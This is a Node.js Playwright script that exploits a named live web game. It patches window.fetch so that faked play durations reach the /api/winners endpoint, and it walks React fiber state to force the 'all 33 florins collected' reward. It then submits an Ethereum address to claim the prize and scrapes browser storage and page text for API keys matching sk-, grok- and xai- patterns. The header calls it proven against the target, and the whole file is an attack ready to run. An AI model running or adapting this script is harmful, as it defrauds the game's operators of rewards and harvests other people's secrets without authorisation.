// Playwright skeleton — force in-game reward state + fake durations + capture API key/reward evidence.
// Proven against a React canvas game where POST /api/winners accepted {address, mission, durationSeconds} unvalidated.
//
// Usage: npm i playwright && node this.js
// Adjust: TARGET_URL, ETH_ADDRESS, MISSION_STRING, and the fiber-state property names ('hung'/'grabbed').

const { chromium } = require('playwright');

const TARGET = 'https://galleria.theflorentines.xyz/';
const ADDR = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e';
const MISSION = 'collected all 33 florins'; // must EXACTLY match what the client sends — grep the JS bundle

(async () => {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const page = await browser.newPage({ viewport: { width: 1280, height: 720 } });

  // Capture every API call
  page.on('request', req => {
    if (req.url().includes('/api/')) console.log(`[REQ ${req.method()}] ${req.url()} :: ${req.postData() || ''}`);
  });
  page.on('response', async res => {
    if (res.url().includes('/api/')) {
      console.log(`[RESP ${res.status()}] ${res.url()} :: ${(await res.text().catch(() => '<err>')).slice(0, 3000)}`);
    }
  });

  // Fake client-computed durations before any page JS runs
  await page.addInitScript(() => {
    const orig = window.fetch;
    window.fetch = function (...args) {
      const [url, opts] = args;
      if (typeof url === 'string' && url.includes('/api/winners') && opts?.body) {
        try {
          const b = JSON.parse(opts.body);
          b.durationSeconds = Math.floor(Math.random() * 600) + 2100; // 35–45 min
          args = [url, { ...opts, body: JSON.stringify(b) }];
        } catch (e) {}
      }
      return orig.apply(this, args);
    };
  });

  await page.goto(TARGET, { timeout: 60000 });
  await page.waitForTimeout(5000);

  // Start the game: click canvas, press Enter/Space, click again (may need to close a modal with ✕)
  const canvas = await page.$('canvas');
  const box = await canvas.boundingBox();
  await page.mouse.click(box.x + box.width / 2, box.y + box.height / 2);
  await page.keyboard.press('Enter');
  await page.keyboard.press(' ');
  await page.mouse.click(box.x + box.width / 2, box.y + box.height / 2);
  await page.waitForTimeout(2000);

  // Force the reward state via React fiber walk (deterministic; random gameplay gets stuck)
  const result = await page.evaluate(() => {
    let found = false;
    for (const el of document.querySelectorAll('*')) {
      for (const key of Object.keys(el)) {
        if (!key.startsWith('__reactFiber')) continue;
        (function walk(f, d) {
          if (!f || d > 500 || found) return;
          let hook = f.memoizedState;
          while (hook) {
            const ms = hook.memoizedState;
            if (ms && typeof ms === 'object' && ms !== null) {
              const target =
                ms.current && typeof ms.current === 'object' && ('hung' in ms.current || 'grabbed' in ms.current)
                  ? ms.current
                  : typeof ms.hung === 'number' || typeof ms.grabbed === 'number'
                    ? ms
                    : null;
              if (target) {
                target.grabbed = 33; target.hung = 33; target.viewed = 33;
                target.rewardShown = false; target.completionMs = performance.now();
                found = true;
                return;
              }
            }
            hook = hook.next;
          }
          if (f.child) walk(f.child, d + 1);
          if (f.sibling) walk(f.sibling, d + 1);
        })(el[key], 0);
      }
    }
    return found;
  });
  console.log('[fiber inject]', result);

  await page.waitForTimeout(4000);

  const inputCount = await page.evaluate(() => document.querySelectorAll('input').length);
  console.log('[reward overlay inputs]', inputCount);

  if (inputCount > 0) {
    await page.fill('input', ADDR);
    await page.waitForTimeout(500);
    await page.evaluate(() => {
      const btns = [...document.querySelectorAll('button')];
      const submit = btns.find(b => b.textContent.includes('Submit'));
      (submit || btns[btns.length - 1]).click();
    });
    await page.waitForTimeout(8000);
  }

  // Evidence dump: response bodies are already printed; also check storage + DOM for reward/keys
  const dump = await page.evaluate(() => {
    const ls = {}; for (let i = 0; i < localStorage.length; i++) ls[localStorage.key(i)] = localStorage.getItem(localStorage.key(i));
    const ss = {}; for (let i = 0; i < sessionStorage.length; i++) ss[sessionStorage.key(i)] = sessionStorage.getItem(sessionStorage.key(i));
    const body = document.body.innerText;
    const keyPatterns = [...new Set([
      ...(body.match(/sk-[A-Za-z0-9_-]+/g) || []),
      ...(body.match(/grok-[A-Za-z0-9_-]+/gi) || []),
      ...(body.match(/xai-[A-Za-z0-9_-]+/gi) || []),
    ])];
    return { pageText: body.slice(0, 2000), ls, ss, keyPatterns };
  });
  console.log('[dump]', JSON.stringify(dump, null, 2));

  await page.screenshot({ path: '/tmp/galleria_done.png', fullPage: true });
  await browser.close();
})();
